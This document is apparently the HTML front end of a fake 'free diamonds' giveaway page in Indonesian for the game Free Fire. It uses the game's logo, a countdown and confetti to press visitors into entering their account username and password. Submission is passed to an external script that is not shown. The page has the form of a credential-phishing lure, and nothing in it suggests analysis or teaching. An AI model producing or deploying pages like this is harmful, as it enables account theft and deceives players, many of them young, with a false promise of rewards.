
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Event Diamond Gratis - Free Fire 2025</title>
    <link rel="stylesheet" href="style.css">
    <script src="confetti.js"></script>
</head>
<body>
    <div class="container">
        <img src="assets/logo.png" alt="Free Fire Logo" class="logo">
        <h1 id="title">Event Diamond Gratis</h1>
        <p id="subtitle">Login akun Free Fire kamu untuk klaim hadiah</p>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginButton">Login</button>
        </form>
        <div id="countdown"></div>
    </div>
    <audio id="clickSound" src="assets/sound.mp3"></audio>
    <div id="loading" class="hidden">
        <img src="assets/diamond.gif" alt="Loading...">
    </div>
    <script src="script.js"></script>
</body>
</html>
